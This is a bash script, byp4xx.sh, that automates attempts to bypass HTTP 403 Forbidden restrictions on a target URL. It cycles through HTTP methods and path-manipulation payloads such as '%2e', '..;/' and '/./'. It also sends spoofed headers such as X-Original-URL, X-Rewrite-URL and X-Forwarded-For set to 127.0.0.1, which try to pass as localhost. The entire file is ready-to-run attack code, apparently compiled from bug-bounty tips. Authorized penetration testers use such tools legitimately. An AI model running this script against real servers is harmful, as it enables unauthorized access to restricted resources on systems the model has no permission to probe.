#!/bin/bash

#Show usage
if [ "$#" -ne 1 ]
then
	echo "Usage: ./byp4xx.sh http://url/path/"
	exit
fi

#Check URL starts with http*
echo $1 | grep -i ^http > /dev/null
if [ $? -gt 0 ] 
then
	echo "Note: Start your url with http:// or https://"
	exit
fi

#Parse URL and DIR
URL=$(echo $1 | cut -d "/" -f -3)"/"
DIR=$(echo $1 | cut -d "/" -f 4- | sed -e 's/\/$//g')

#HTTP Verbs/Methods
echo -e "\e[1m\e[32m----HTTP Methods----\e[0m"
echo "GET request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR)
echo "POST request: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "Content-Length:0" -X POST $URL$DIR)
echo "HEAD request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X HEAD $URL$DIR)
echo "OPTIONS request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X OPTIONS $URL$DIR)
echo "PUT request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X PUT $URL$DIR)
#DELETE disable by default
#echo "DELETE request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X DELETE $URL$DIR)
echo "TRACE request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X TRACE $URL$DIR)
echo "TRACK request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X TRACK $URL$DIR)
echo "CONNECT request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X CONNECT $URL$DIR)
echo "PATCH request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X PATCH $URL$DIR)
echo
#Bugbountytips methods compilation
echo -e "\e[1m\e[32m----403 bypass methods----\e[0m"
echo "%2e payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL%2e/$DIR)
echo "/. payload: "$(curl -k -s -o /dev/null --path-as-is -w "%{http_code}" -X GET "$URL$DIR/.")
echo "? payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR?)
echo "?? payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR??)
echo "// payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL/$DIR//)
echo "/./ payload: "$(curl -k -s -o /dev/null --path-as-is -w "%{http_code}" -X GET $URL./$DIR/./)
echo "/ payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR/)
echo "/.randomstring payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET "$URL$DIR/".randomstring)
echo "..;/ payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET "$URL$DIR..;/")
echo
#HEADERS
echo -e "\e[1m\e[32m----HEADERS----\e[0m"
echo "Referer: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "Referer: $URL$DIR" -X GET "$URL$DIR")
echo "X-Custom-IP-Authorization: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL$DIR")
echo "X-Custom-IP-Authorization+..;/: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL$DIR..;/")
echo "X-Original-URL: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Original-URL: /$DIR" -X GET $URL"anything")
echo "X-Rewrite-URL: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Rewrite-URL: /$DIR" -X GET "$URL")
echo "X-Originating-IP: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Originating-IP: 127.0.0.1" -X GET "$URL$DIR")
echo "X-Forwarded-For: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL$DIR")
echo "X-Remote-IP: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Remote-IP: 127.0.0.1" -X GET "$URL$DIR")
echo "X-Client-IP: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Client-IP: 127.0.0.1" -X GET "$URL$DIR")
echo "X-Host: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Host: 127.0.0.1" -X GET "$URL$DIR")
echo "X-Forwared-Host: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "X-Forwared-Host: 127.0.0.1" -X GET "$URL$DIR")
